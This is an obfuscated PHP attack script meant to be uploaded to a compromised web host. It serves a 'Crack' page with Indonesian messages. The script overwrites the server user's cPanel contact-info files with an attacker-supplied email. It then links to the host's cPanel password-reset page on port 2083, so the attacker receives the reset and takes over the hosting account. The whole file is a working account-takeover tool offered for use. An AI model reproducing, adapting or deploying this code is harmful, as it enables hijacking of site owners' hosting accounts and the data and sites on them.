<?php

error_reporting(0);

echo '<html> <head>      <title>2easy/4/destroy</title>      <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />       <style>        .draw {

  height:45px;

}

.wis{

  height: 25px;

}body {      color:#80D713;      background-color:#f0eff0;;      }      .logo{ height:70px;}                 input[type="email"] { border-radius:5px; border-bottom-color: blue; border-top-color: blue; padding: 10; }          </style>   </head> <body>   <br><br><br><br> <center>  <div style=" border: 7px double; border-color: #F90000;border-radius: 16px 16px 16px 16px;-moz-border-radius: 16px 16px 16px 16px;-webkit-border-radius: 16px 16px 16px 16px;height:auto;width:500px; background-color:black;  color:white;"><br><br> <img class="logo"src="https://i.ibb.co/QmQKZ5P/cooltext317061495600572.png">   <br><br><img src="https://i.ibb.co/rkSDvbR/cooltext317065797563271.png" class="draw">   <br><br>  <form action="#" method="post">  <input type="email" name="email" placeholder="Email kalian" style="background-color: " />   <input type="submit" name="submit" value="Crack" style="background-color: transparent;font: 15pt cursive;color:#80D713;"/>  </form>         <br /><br /><br />  </p>    '; ?> <?php

$IIIIIIIIIIII = get_current_user();

$IIIIIIIIIII1 = $_SERVER['HTTP_HOST'];

$IIIIIIIIIIlI = getenv('REMOTE_ADDR');

if (isset($_POST['submit'])) { $email = $_POST['email'];

$IIIIIIIIIIl1 = 'email:' . $email; $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); fclose($IIIIIIIIII1I);

$IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.contactinfo', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); fclose($IIIIIIIIII1I); $IIIIIIIIIlIl = "https://";

$IIIIIIIIIlI1 = "2083";

$IIIIIIIIIllI = $IIIIIIIIIII1 . ':2083/resetpass?start=1';

$read_named_conf = @file('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo');

if(!$read_named_conf)

{

echo "<h1>gak bisa di akses goblok</h1><br><br> </pre></center>";

}

else

{

echo "<center>SALIN INI BOY LALU GASS <BR><BR></center>"; echo '<center><input type="text" value="' . $IIIIIIIIIIII . '" id="user"> <button onclick="username()">SALIN TEXT</button></center> <script>function username() { var copyText = document.getElementById("user"); copyText.select(); document.execCommand("copy"); } </script> '; echo '<br/><center><a  target="_blank" href="' . $IIIIIIIIIlIl . '' . $IIIIIIIIIllI . '"><img class="wis"src="https://i.ibb.co/hgKSY0K/cooltext317065123408510.png"></a><br><br></center>'; ;}} ?></div> </div></center>
</body> 
</html>

